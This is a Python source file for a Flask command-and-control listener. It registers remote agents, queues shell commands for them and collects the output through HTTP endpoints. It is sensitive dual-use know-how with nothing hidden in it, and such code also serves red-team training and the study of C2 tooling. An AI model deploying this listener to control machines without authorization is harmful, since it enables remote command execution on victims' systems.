import os
import json
#from encryption import *
from task import TaskShell
from agent import Agent
from database import Database
from flask import Flask, request, jsonify
import random

class Listener:
    def __init__(self, name, port, ipaddress):
        self.name = name
        self.port = port
        self.ipaddress = ipaddress
        # Define the directory paths for listener data
        self.Path = "data/listeners/{}/".format(self.name)
        self.keyPath = "{}key".format(self.Path)
        self.filePath = "{}files/".format(self.Path)
        self.agentsPath = "{}agents/".format(self.Path)

        # Create directories if they don't exist
        if not os.path.exists(self.Path):
            os.makedirs(self.Path)
        if not os.path.exists(self.agentsPath):
            os.makedirs(self.agentsPath)
        if not os.path.exists(self.filePath):
            os.makedirs(self.filePath)

        self.database = Database(self.agentsPath)
        self.agentsList = self.database.getAgents()
    
    def start(self):
        print("Listener '{}' started on {}:{}".format(self.name, self.ipaddress, self.port))
        app = Flask(__name__)

        @app.route('/register', methods=['POST'])
        def register_agent():
            res = request.json
            agent = Agent(res.get('name'), res.get('ip'), res.get('hostname'), res.get('key'), self.agentsPath)
            self.database.setAgent(agent)
            try:
                self.agentsList[agent.getName()] = agent
            except:
                return("[Listener] Error during agent registering !", 404)
            
            return(res.get('name'),200)

        @app.route('/setTask', methods=['POST'])
        def set_task():
            res = request.json
            taskType = res.get('type')
            agentName = res.get('agent')
            try:
                agent = self.agentsList[agentName]
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            if taskType == "shell":
                task = TaskShell()
                task.setTask(res.get("command"))
                self.agentsList[agentName].setTask(task)

            return("[Listener] Task send !", 200)

        @app.route('/ping', methods=['GET'])
        def ping():
            return(jsonify({'message': 'pong'}), 200)

        @app.route('/getTask', methods=['GET'])
        def get_task():
            agentName = request.args.get('agent')

            try:
                task = self.agentsList[agentName].getTask()
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            if task.getTask() == "" or task is None:
                return("", 204)
            else:
                return(task.getTask(), 200)

        @app.route('/postResult', methods=['POST'])
        def post_result():
            res = request.json
            agentName = res.get('agent')
            result = res.get('result')
            
            try:
                task = self.agentsList[agentName].getTask()
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            task.receiveResult(result)

            return("ok",200)
        
        @app.route('/getResult', methods=['GET'])
        def get_result():
            agentName = request.args.get('agent')

            try:
                task = self.agentsList[agentName].getTask()
            except KeyError:
                return("[Listener] Agent not registered !", 404)

            result = task.getResult()

            if result == "":
                return("[Listener] Result not receive", 204)
            else:
                task.clearTask()
                return(result, 200)

        app.run(host=self.ipaddress, port=self.port)
